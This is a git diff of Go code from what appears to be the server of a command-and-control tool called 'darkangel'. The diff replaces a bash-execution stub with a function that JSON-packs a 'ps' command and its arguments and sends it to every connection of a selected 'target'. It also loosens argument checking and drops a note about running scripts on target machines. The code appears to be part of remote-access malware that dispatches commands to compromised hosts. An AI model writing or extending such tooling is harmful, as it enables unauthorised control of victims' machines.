@@ -2,7 +2,10 @@ package core
 
 import (
 	"bytes"
+	"darkangel/server/constant"
+	"encoding/json"
 	"fmt"
+	"log"
 	"text/tabwriter"
 )
 
@@ -19,7 +22,7 @@ func HandleCommand(request Request) CommandResult {
 		return HandleCommandDoesNotExists(request.CommandName)
 	}
 
-	if len(request.Args) != len(cmd.Arguments) {
+	if len(request.Args) < len(cmd.Arguments) {
 		return HandleCommandWrongArgumentsLength(cmd, request)
 	}
 
@@ -51,17 +54,27 @@ func connectionsCmd(request Request) CommandResult {
 	}
 }
 
-func execBashCmd(request Request) CommandResult {
+func packData(data map[string]interface{}) []byte {
+	v, err := json.Marshal(data)
+	if err != nil {
+		log.Fatal("Couldn't Marshall data")
+	}
+	return v
+}
+
+func execPsCmd(request Request) CommandResult {
 	targets := request.Server.GetConnection(request.Args[0])
 	if targets == nil {
 		return HandleWrongTarget(request)
 	}
 
 	for _, target := range targets {
-		fmt.Println(target.Conn.RemoteAddr().String())
+		data := packData(map[string]interface{}{"name": "ps", "args": request.Args[1:]})
+		_, err := target.Conn.Write([]byte(data))
+		if err != nil {
+			log.Fatalln(fmt.Sprintf(constant.Red+"Couldn't write to target %s"+constant.Reset, target.Conn.RemoteAddr()))
+		}
 	}
-
-	// script := request.Args[2] // todo execute this script on target machine and return response with channels
 
 	return CommandResult{}
 }
